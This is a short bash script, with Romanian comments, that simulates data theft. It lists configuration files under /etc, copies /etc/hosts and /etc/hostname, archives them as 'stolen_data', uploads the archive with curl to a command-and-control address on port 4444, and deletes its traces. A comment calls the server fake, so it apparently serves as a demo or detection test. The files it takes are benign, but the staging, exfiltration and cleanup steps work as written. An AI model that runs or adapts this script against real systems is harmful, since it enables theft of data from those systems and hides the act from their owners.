#!/bin/bash
STAGING_DIR="/tmp/staging_area"
mkdir -p $STAGING_DIR

echo "[*] Hunting for sensitive files..."
# Caută fișiere de configurare
find /etc -name "*.conf" 2>/dev/null | head -n 10 > $STAGING_DIR/config_list.txt

# Copiază fișiere "critice"
cp /etc/hosts $STAGING_DIR/
cp /etc/hostname $STAGING_DIR/

echo "[*] Compressing data for exfiltration..."
# Arhivează totul
tar -czvf /tmp/stolen_data.tar.gz $STAGING_DIR

echo "[*] Sending data to C2 server..."
# Încearcă să trimită datele (către un server fals)
# Metoda 1: HTTP Post
curl -X POST -F "file=@/tmp/stolen_data.tar.gz" http://192.168.12.5:4444/

# Cleanup
rm -rf $STAGING_DIR
rm /tmp/stolen_data.tar.gz
